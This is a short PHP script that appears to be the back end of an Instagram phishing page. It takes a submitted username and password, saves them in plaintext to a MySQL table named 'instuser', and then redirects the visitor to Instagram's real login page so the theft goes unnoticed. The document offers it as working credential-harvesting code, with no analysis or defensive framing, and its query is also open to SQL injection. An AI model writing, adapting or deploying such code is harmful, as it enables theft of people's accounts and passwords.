<?php
    $gmail = filter_var(trim($_POST['username']), 
    FILTER_SANITIZE_STRING);
    $password = filter_var(trim($_POST['password']), 
    FILTER_SANITIZE_STRING);

    $mysql = new mysqli('127.0.0.1', 'mysql', 'mysql', 'myinst-bd');
    $mysql->query("INSERT INTO `instuser` (`gmail`, `password`) 
    VALUES ('$gmail', '$password')");

    header('Location: https://www.instagram.com/accounts/login/');
?>